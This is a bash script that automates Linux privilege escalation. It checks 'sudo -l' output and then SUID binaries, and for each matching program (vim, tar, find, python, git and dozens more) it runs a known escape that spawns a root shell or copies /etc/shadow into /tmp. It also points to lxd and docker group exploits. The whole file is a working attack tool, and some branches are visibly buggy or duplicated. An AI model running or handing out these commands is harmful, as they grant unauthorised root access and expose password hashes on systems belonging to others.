sudo_file=$(mktemp)
sudo -l >$sudo_file
file1=$(cat $sudo_file)
if [[ $file1 ==  *"/usr/bin/awk"* ]]; then
	sudo awk 'BEGIN {system("/bin/bash")}' 
elif  [[ $file1 ==  *"/usr/bin/apt"* ]]; then
	sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
elif  [[ $file1 ==  *"/usr/bin/arp"* ]]; then
	arp -v -f /etc/shadow > /tmp/shadow.log
	cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/bash"* ]]; then
	sudo bash
elif  [[ $file1 ==  *"/usr/bin/ash"* ]]; then
		sudo ash
elif  [[ $file1 ==  *"/usr/bin/base32"* ]]; then
	sudo base32 "/etc/shadow" | base32 --decode >"/tmp/shadow.log"
	cat "/tmp/shadow.log"
elif  [[ $file1 ==  *"/usr/bin/base64"* ]]; then
	$(sudo base64 "/etc/shadow" | base64 --decode >/tmp/shadow.log)
	cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/bpftrace"* ]]; then
		sudo bpftrace -e 'BEGIN {system(\"/bin/bash\");exit()}'
elif  [[ $file1 ==  *"/usr/bin/cut"* ]]; then
	sudo cut -d "" -f1 '/etc/shadow'
	cat "/tmp/shadow.log"
elif  [[ $file1 ==  *"/usr/bin/python"* ]]; then
	sudo python -c 'import os; os.system(\"/bin/bash\")'
elif  [[ $file1 ==  *"/usr/bin/mysql"* ]]; then
	sudo mysql -e '\! /bin/bash'
elif  [[ $file1 ==  *"/usr/bin/vim"* ]]; then
	sudo vim -c ':!/bin/bash'
elif  [[ $file1 ==  *"/usr/bin/find"* ]]; then
	sudo find . -exec /bin/sh ; -quit
elif  [[ $file1 ==  *"/usr/bin/chmod"* ]]; then
	sudo chmod +s /bin/bash
	 bash -p
elif  [[ $file1 ==  *"/usr/bin/chroot"* ]]; then
	sudo chroot /
elif  [[ $file1 ==  *"/usr/bin/zip"* ]]; then
	TF=$(mktemp -u)
	sudo zip $TF /etc/hosts -T -TT 'sh #'
	sudo rm $TF
elif  [[ $file1 ==  *"/usr/bin/zsh"* ]]; then
	sudo zsh
elif  [[ $file1 ==  *"/usr/bin/vi"* ]]; then
	sudo vi -c ':!/bin/bash' '/dev/null'
elif  [[ $file1 ==  *"/usr/bin/tmux"* ]]; then
	sudo tmux
elif  [[ $file1 ==  *"/usr/bin/tar"* ]]; then
	sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
elif  [[ $file1 ==  *"/usr/bin/su"* ]]; then
	sudo su
elif  [[ $file1 ==  *"/usr/bin/strings"* ]]; then
	sudo strings /etc/shadow > /tmp/shadow.log
	cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/tail"* ]]; then
	sudo tail -c1G /etc/shadow >/tmp/shadow.log
	cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/tac"* ]]; then
	sudo tac -s 'RANDOM' /etc/shadow > /tmp/shadow.log
	cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/sort"* ]]; then
	sudo sort -m /etc/shadow >/tmp/shadow.log
	cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/perl"* ]]; then
	sudo perl -e 'exec \"/bin/sh\";'
elif  [[ $file1 ==  *"/usr/bin/git"* ]]; then
	sudo PAGER='sh -c \"exec bash 0<&1\"' git -p help
elif  [[ $file1 ==  *"/usr/bin/gcc"* ]]; then
	sudo gcc -wrapper /bin/sh,-s .
elif  [[ $file1 ==  *"/usr/bin/file"* ]]; then
  	sudo file -f /etc/shadow >/tmp/shadow.log
  	cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/date"* ]]; then
		sudo date -f /etc/shadow >/tmp/shadow.log
		cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/dpkg"* ]]; then
	echo "sudo dpkg -l"
	echo "!/bin/bash"
elif  [[ $file1 ==  *"/usr/bin/ltrace"* ]]; then
	sudo ltrace -b -L /bin/bash
elif  [[ $file1 ==  *"/usr/bin/crontab"* ]]; then
	echo "sudo crontab -e"
	echo "*/1 * * * * chmod +s /bin/bash"
elif  [[ $file1 ==  *"/usr/bin/php"* ]]; then
	sudo php -r "system('/bin/bash');"
elif  [[ $file1 ==  *"/usr/bin/dash"* ]]; then
	sudo dash
elif  [[ $file1 ==  *"/usr/bin/env"* ]]; then
		sudo env /bin/bash
elif  [[ $file1 ==  *"/usr/bin/fold"* ]]; then
		sudo fold -w99999999 /etc/shadow >/tmp/shadow.log
		 cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/fmt"* ]]; then
		sudo fmt -999 /etc/shadow >/tmp/shadow.log
		cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/head"* ]]; then
		sudo head -c1G /etc/shadow >/tmp/shadow.log
		cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/ip"* ]]; then
		sudo ip -force -batch /etc/shadow >/tmp/shadow.log
		cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/look"* ]]; then
		sudo look '' /etc/shadow > /tmp/shadow.log
		cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/less"* ]]; then
	echo "sudo less /etc/profile"
	echo "!/bin/bash"
elif  [[ $file1 ==  *"/usr/bin/mount"* ]]; then
		sudo mount -o bind /bin/bash /bin/mount
		sudo mount
elif  [[ $file1 ==  *"/usr/bin/more"* ]]; then
	echo "TERM= sudo more /etc/profile"
	echo "!/bin/bash"
elif  [[ $file1 ==  *"/usr/bin/hexdump"* ]]; then
		sudo hexdump -C /etc/shadow >/tmp/shadow.log
		cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/tee"* ]]; then
		echo DATA | sudo tee -a /etc/shadow >/tmp/shadow.log
		cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/time"* ]]; then
		sudo /usr/bin/time /bin/bash
elif  [[ $file1 ==  *"/usr/bin/timeout"* ]]; then
		sudo timeout --foreground 7d /bin/bash
elif  [[ $file1 ==  *"/usr/bin/screen"* ]]; then
		sudo screen
elif  [[ $file1 ==  *"/usr/bin/script"* ]]; then
		sudo script -q /dev/null
elif  [[ $file1 ==  *"/usr/bin/rlwrap"* ]]; then
		sudo rlwrap /bin/bash
elif  [[ $file1 ==  *"/usr/bin/puppet"* ]]; then
		sudo puppet apply -e "exec { '/bin/sh -c \\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\"': }"
elif  [[ $file1 ==  *"/usr/bin/rake"* ]]; then
		sudo rake -p '`/bin/bash 1>&0`'
elif  [[ $file1 ==  *"/usr/bin/pg"* ]]; then
	echo "sudo pg /etc/profile"
	echo "!/bin/bash"
elif  [[ $file1 ==  *"/usr/bin/nice"* ]]; then
		sudo nice /bin/bash
elif  [[ $file1 ==  *"/usr/bin/mtr"* ]]; then
		sudo mtr --raw -F /etc/shadow > /tmp/shadow.log
		cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/ksh"* ]]; then
		sudo ksh
elif  [[ $file1 ==  *"/usr/bin/gimp"* ]]; then
		sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("bash")'
elif  [[ $file1 ==  *"/usr/bin/gem"* ]]; then
		sudo gem open -e "/bin/bash -c /bin/bash" rdoc
elif  [[ $file1 ==  *"/usr/bin/grep"* ]]; then
		sudo grep '' /etc/shadow >/tmp/shadow.log
		cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/aria2c"* ]]; then
	echo "COMMAND='id'"
	echo "TF=\$(mktemp)"
	echo "echo \"\$COMMAND\" > \$TF"
	echo "chmod +x \$TF"
	echo "sudo aria2c --on-download-error=\$TF http://x"
elif  [[ $file1 ==  *"/usr/bin/gcc"* ]]; then
		sudo gcc -wrapper /bin/bash,-s .
elif  [[ $file1 ==  *"/usr/bin/irb"* ]]; then
	echo "sudo irb"
	echo "exec '/bin/bash'"
elif  [[ $file1 ==  *"/usr/bin/ksshell"* ]]; then	
		sudo ksshell -i /etc/shadow > /tmp/shaow.log
		cat /tmp/shadow.log
elif  [[ $file1 ==  *"/usr/bin/ssh"* ]]; then
	sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x

else 
	find / -perm -u=s -type f 2>/dev/null>/tmp/suid.log
	id >/tmp/id.log
	file3=$(cat /tmp/id.log)
	file2=$(cat /tmp/suid.log)
	if [[ $file2 ==  *"/usr/bin/nmap"* ]]; then
		TF=$(mktemp)
		echo 'os.execute("/bin/bash")' > $TF
		nmap --script=$TF
	elif  [[ $file2 ==  *"/usr/bin/env"* ]]; then
		env /bin/bash -p
elif  [[ $file2 ==  *"/usr/bin/bash"* ]]; then
		bash -p
elif  [[ $file2 ==  *"/usr/bin/awk"* ]]; then
		awk 'BEGIN {system(\"/bin/bash\")}'
elif  [[ $file2 ==  *"/usr/bin/ed"* ]]; then
	echo "ed"
	echo "!/bin/bash"
elif  [[ $file2 ==  *"/usr/bin/gawk"* ]]; then
		gawk 'BEGIN {system(\"/bin/bash\")}'
elif  [[ $file2 ==  *"/usr/bin/mysql"* ]]; then
		mysql -e '\! /bin/bash'
elif  [[ $file2 ==  *"/usr/bin/rake"* ]]; then
		rake -p '\`/bin/bash 1>&0\`'
elif  [[ $file2 ==  *"/usr/bin/slsh"* ]]; then
		slsh -e 'system("/bin/bash")'
elif  [[ $file2 ==  *"/usr/bin/vim"* ]]; then
		vim -c ':lua os.execute(\"reset; exec bash")'
elif  [[ $file2 ==  *"/usr/bin/view"* ]]; then
		view -c ':lua os.execute(\"reset; exec bash")'
elif  [[ $file2 ==  *"/usr/bin/watch"* ]]; then
		watch 'reset; exec bash 1>&0 2>&0'
elif  [[ $file2 ==  *"/usr/bin/mawk"* ]]; then
		mawk 'BEGIN {system("/bin/bash")}'
elif  [[ $file2 ==  *"/usr/bin/lua"* ]]; then
		lua -e 'os.execute("/bin/bash")'
elif  [[ $file2 ==  *"/usr/bin/iftop"* ]]; then
	echo "iftop"
	echo "!/bin/bash"
elif  [[ $file2 ==  *"/usr/bin/prv"* ]]; then
	echo "prv"
	echo "system('/bin/bash')"
elif  [[ $file3 ==  *"lxd"* ]]; then
	echo -e " \e[31mlxd group exploit"
 	echo -e "\e[91mhttps://www.hackingarticles.in/lxd-privilege-escalation/"
 	echo -e "\e[91mhttps://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/"
 	
elif  [[ $file3 ==  *"docker"* ]]; then
	echo -e " \e[31mdocker group exploit"
	echo -e "https://blog.martiert.com/the-docker-group-and-privilege-escalation/"
	echo -e "https://www.hackingarticles.in/docker-privilege-escalation/"

fi
fi
